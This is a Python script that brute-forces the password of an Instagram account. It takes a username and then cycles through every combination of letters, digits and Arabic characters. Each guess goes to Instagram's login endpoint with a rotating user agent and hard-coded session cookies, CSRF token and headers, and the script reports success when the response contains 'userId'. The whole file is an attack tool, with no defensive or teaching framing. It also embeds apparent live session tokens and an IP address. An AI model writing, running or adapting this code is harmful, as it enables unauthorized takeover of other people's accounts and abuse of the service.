import requests
import getpass
import itertools
import string
import random
import tools
import sys
#print(useragents)
us = input('ENTER YOUR USERNAME : ')

loginurl='https://www.instagram.com/accounts/login/ajax/'
#------------------------------

chars = string.ascii_lowercase + string.digits + 'ضصثقفغعهخحجدطكمنتالبيسشئءؤرلىةوزذإآ'
attempts = 0
for password_length in range(5, 14):
    for guess in itertools.product(chars, repeat=password_length):
        useragents = random.choice(tools.headers_useragents)
        login = {
'accept': "*/*",
'accept-encoding': "gzip, deflate, br",
'accept-language': "en-DZ,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5,en-US;q=0.4",
'content-length':"339",
'content-type': "application/x-www-form-urlencoded",
'cookie': 'ig_nrcb=1; ig_did=A577F8CC-7FEF-4958-824F-CA1D5A2C998D; mid=X_I7LgAEAAHqNbPdG_-pVVFVb02A; fbm_124024574287414=base_domain=.instagram.com; shbid=10062; shbts=1610112305.0874965; rur=FRC; csrftoken=wdPwS0TP6Ww01W1EESEST1mwOqJnp5qE; urlgen="{\"105.235.136.51\": 33779\054 \"105.235.134.59\": 33779}:1kxxf4:jx8gQYfyTYSt5lVD5owmMFcqcQA"',
'origin': "https://www.instagram.com",
'referer': "https://www.instagram.com/accounts/login/",
'sec-fetch-dest': "empty",
'sec-fetch-mode':"cors",
'sec-fetch-site':"same-origin",
'user-agent': useragents,
'x-csrftoken': "wdPwS0TP6Ww01W1EESEST1mwOqJnp5qE",
'x-ig-app-id': "936619743392459",
'x-ig-www-claim': "hmac.AR0-KMDK3oo27FfpKawBoo73vi3Y-GHZV8aupjUbzaEpQm6x",
'x-instagram-ajax': "818fed40bc2e",
'x-requested-with': "XMLHttpRequest"
}
        attempts += 1
        guess = ''.join(guess)
        data = {
            'username':us,
            'enc_password':'#PWD_INSTAGRAM_BROWSER:0:&:' + guess
        }
        r = requests.post(loginurl,data=data,headers=login).text
            
        if 'userId' in r:
            print('welcome ' + us + 'password is : ' + guess)
            sys.exit()
        else:
            print('wrong password : {} the guess nemper : {}'.format(guess,attempts))
